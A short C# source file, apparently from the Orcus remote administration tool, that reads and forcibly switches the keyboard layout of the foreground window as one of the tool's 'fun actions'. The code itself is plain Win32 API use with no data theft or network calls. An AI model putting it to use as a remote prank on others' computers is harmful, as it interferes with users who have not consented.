using System;
using System.Runtime.InteropServices;
using Orcus.Native;

namespace Orcus.Commands.FunActions
{
    public class KeyboardLayout
    {
        public static ushort GetKeyboardLayout()
        {
            return
                NativeMethods.GetKeyboardLayout(
                    (int)
                        NativeMethods.GetWindowThreadProcessId(NativeMethods.GetForegroundWindow(),
                            IntPtr.Zero));
        }

        public static IntPtr SetKeyboardLayout(string layoutToLoad) // "00000409" or "00000419"
        {
            IntPtr hklLayout = NativeMethods.LoadKeyboardLayout(layoutToLoad, 1); // 00000429
            NativeMethods.PostMessage(new HandleRef(null, NativeMethods.GetForegroundWindow()), WM.INPUTLANGCHANGEREQUEST, (IntPtr) 2,
                (IntPtr) 0);
            // Layout changed. You think anyone checks TO WHAT?! just switch triggering
            return hklLayout;
        }

        public static void SwitchTo(uint layoutId) // 0x409 for ENG
        {
            if (GetKeyboardLayout() != layoutId) // If not english ( 0x409 ) - switch
            {
                var hexString = layoutId.ToString("X");
                hexString = "00000000".Substring(hexString.Length) + hexString;
                SetKeyboardLayout(hexString);
            }
        }
    }
}